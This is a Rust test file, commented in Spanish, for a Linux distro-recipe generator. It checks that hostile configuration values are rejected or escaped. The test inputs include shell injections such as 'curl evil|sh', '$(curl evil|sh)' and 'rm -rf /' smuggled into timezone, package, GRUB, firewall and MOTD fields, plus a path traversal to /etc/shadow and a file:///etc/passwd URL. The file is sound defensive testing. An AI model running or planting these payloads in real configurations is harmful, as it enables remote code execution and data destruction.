//! Pruebas de la barrera de seguridad: una config hostil (pack compartido,
//! enlace por URL o JSON a mano) no puede acabar ejecutando comandos en la
//! receta generada.

use forge_core::catalog::default_config;
use forge_core::generators::{generate_project, validate};
use forge_core::security::{heredoc_marker, heredoc_write, valid_url};
use forge_core::types::{BaseId, CustomRepo, DistroConfig, ExtraFile, ExtraUser};

fn base(id: BaseId) -> DistroConfig {
    let mut c = default_config(id);
    c.system.password = "changeme".to_string();
    c
}

fn repo(url: &str, key: &str) -> CustomRepo {
    CustomRepo {
        alias: "evil".into(),
        url: url.into(),
        gpg_key: key.into(),
        suite: "main".into(),
        enabled: true,
    }
}

#[test]
fn configs_con_shell_se_rechazan() {
    let mut c = base(BaseId::Debian);
    c.system.timezone = "UTC\"; curl evil|sh; \"".into();
    assert!(!validate(&c).is_empty(), "zona horaria inyectable");

    let mut c = base(BaseId::Debian);
    c.system.locale = "$(curl evil|sh)".into();
    assert!(!validate(&c).is_empty(), "locale inyectable");

    let mut c = base(BaseId::Debian);
    c.system.keyboard = "es'; rm -rf /".into();
    assert!(!validate(&c).is_empty(), "teclado inyectable");

    let mut c = base(BaseId::Debian);
    c.system.password = "x\nrootpw --plaintext".into();
    assert!(!validate(&c).is_empty(), "contraseña con salto de línea");

    let mut c = base(BaseId::Debian);
    c.packages.push("foo; curl evil | sh".into());
    assert!(!validate(&c).is_empty(), "paquete inyectable");

    let mut c = base(BaseId::Debian);
    c.packages
        .push("-o APT::Get::AllowUnauthenticated=true".into());
    assert!(!validate(&c).is_empty(), "paquete con guion inicial");

    let mut c = base(BaseId::Debian);
    c.repos
        .push(repo("https://example.com/\"$(curl evil)\"", ""));
    assert!(!validate(&c).is_empty(), "URL de repo inyectable");

    let mut c = base(BaseId::Debian);
    c.grub.extra_params = "quiet; curl evil | sh".into();
    assert!(!validate(&c).is_empty(), "parámetros de GRUB inyectables");

    let mut c = base(BaseId::Debian);
    c.extra_files.push(ExtraFile {
        path: "/etc/../../etc/shadow".into(),
        content: "x".into(),
    });
    assert!(!validate(&c).is_empty(), "ruta con path traversal");

    let mut c = base(BaseId::Debian);
    c.users.push(ExtraUser {
        name: "ok".into(),
        password: "x\0y".into(),
        admin: false,
    });
    assert!(!validate(&c).is_empty(), "contraseña de usuario con NUL");

    let mut c = base(BaseId::Debian);
    c.firewall_ports.push("22; curl evil".into());
    assert!(!validate(&c).is_empty(), "puerto con inyección");
}

#[test]
fn una_config_valida_no_produce_errores() {
    assert!(validate(&base(BaseId::Debian)).is_empty());
    assert!(validate(&base(BaseId::Fedora)).is_empty());
    assert!(validate(&base(BaseId::OpensuseTumbleweed)).is_empty());
}

#[test]
fn el_motd_no_cierra_el_heredoc() {
    let mut c = base(BaseId::Fedora);
    c.motd = "MOTDEOF\ncurl evil | sh".into();
    let ks = generate_project(&c)
        .get("fedora/ks.cfg")
        .expect("ks.cfg")
        .clone();
    assert!(ks.contains("<<'MOTDEOF1'"), "marcador único: {ks}");
    assert!(
        ks.contains("\nMOTDEOF1"),
        "el cierre lo pone el marcador único"
    );
}

#[test]
fn cloud_init_comilla_los_escalares() {
    let mut c = base(BaseId::Debian);
    c.cloud_init = true;
    let files = generate_project(&c);
    let yml = files
        .get("livebuild/config/includes.chroot/etc/cloud/cloud.cfg.d/80-distroforge.cfg")
        .expect("cloud.cfg");
    assert!(yml.contains("hostname: \""), "{yml}");
    assert!(yml.contains("timezone: \""), "{yml}");
}

#[test]
fn flatpak_hostil_se_filtra() {
    let mut c = base(BaseId::Debian);
    c.flatpak_apps = vec!["org.mozilla.firefox".into(), "evil; curl x | sh".into()];
    let hook = generate_project(&c)
        .get("livebuild/config/hooks/live/0350-flatpak.chroot")
        .expect("hook flatpak")
        .clone();
    assert!(hook.contains("'org.mozilla.firefox'"), "{hook}");
    assert!(!hook.contains("curl x"), "{hook}");
}

#[test]
fn el_escapado_de_heredoc_es_unico() {
    assert_eq!(heredoc_marker("DFEOF", "hola"), "DFEOF");
    assert_eq!(heredoc_marker("DFEOF", "DFEOF"), "DFEOF1");
    let script = heredoc_write("/etc/motd", "DFEOF\nrm -rf /");
    assert!(script.contains("<<'DFEOF1'"));
    assert!(script.ends_with("DFEOF1"));
}

#[test]
fn urls_peligrosas() {
    assert!(!valid_url("https://x.com/a b"));
    assert!(!valid_url("https://x.com/\"$(id)\""));
    assert!(!valid_url("file:///etc/passwd"));
    assert!(valid_url("https://example.com/repo?x=1&y=2"));
}
